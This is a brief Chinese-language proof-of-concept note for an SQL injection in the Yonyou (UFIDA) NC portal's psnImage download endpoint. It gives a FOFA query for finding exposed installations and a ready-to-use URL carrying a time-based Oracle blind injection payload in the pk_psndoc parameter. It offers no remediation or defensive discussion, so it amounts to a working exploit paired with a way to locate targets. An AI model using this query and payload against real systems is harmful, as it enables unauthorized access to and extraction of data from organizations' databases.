# 用友NC接口download存在SQL注入漏洞


## fofa

```yaml
app="用友-UFIDA-NC"
```

## poc

```java
http://ip/portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),5)%20AND%20(%27rASZ%27=%27rASZ
```

